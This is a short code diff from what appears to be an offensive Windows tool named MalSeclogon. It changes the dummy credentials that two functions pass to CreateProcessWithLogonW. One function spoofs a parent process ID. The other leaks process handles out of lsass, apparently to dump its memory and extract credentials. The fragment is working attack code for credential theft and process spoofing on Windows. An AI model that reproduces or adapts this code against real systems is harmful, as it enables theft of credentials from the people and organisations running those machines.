@@ -249,7 +249,7 @@ void MalSeclogonPPIDSpoofing(int pid, wchar_t* cmdline)
 	SpoofPidTeb((DWORD)pid, &originalPid, &originalTid);
 	RtlZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));
 	RtlZeroMemory(&startInfo, sizeof(STARTUPINFO));
-	if (!CreateProcessWithLogonW(L"not", L"valid", L"user", LOGON_NETCREDENTIALS_ONLY, NULL, cmdline, 0, NULL, NULL, &startInfo, &procInfo)) {
+	if (!CreateProcessWithLogonW(L"MalseclogonUser", L"MalseclogonDomain", L"MalseclogonPwd", LOGON_NETCREDENTIALS_ONLY, NULL, cmdline, 0, NULL, NULL, &startInfo, &procInfo)) {
 		printf("CreateProcessWithLogonW() failed with error code %d \n", GetLastError());
 		exit(-1);
 	}
@@ -293,7 +293,7 @@ void MalSeclogonLeakHandles(int lsassPid, wchar_t* dumpPath) {
 		startInfo.hStdOutput = (HANDLE)handlesToLeak[leakedHandlesCounter++];
 		startInfo.hStdError = (HANDLE)handlesToLeak[leakedHandlesCounter++];
 		printf("Attempt to leak process handles from lsass: 0x%p 0x%p 0x%p...\n", startInfo.hStdInput, startInfo.hStdOutput, startInfo.hStdError);
-		if (!CreateProcessWithLogonW(L"not", L"valid", L"user", LOGON_NETCREDENTIALS_ONLY, moduleFilename, newCmdline, 0, NULL, NULL, &startInfo, &procInfo)) {
+		if (!CreateProcessWithLogonW(L"MalseclogonUser", L"MalseclogonDomain", L"MalseclogonPwd", LOGON_NETCREDENTIALS_ONLY, moduleFilename, newCmdline, 0, NULL, NULL, &startInfo, &procInfo)) {
 			printf("CreateProcessWithLogonW() failed with error code %d \n", GetLastError());
 			exit(-1);
 		}
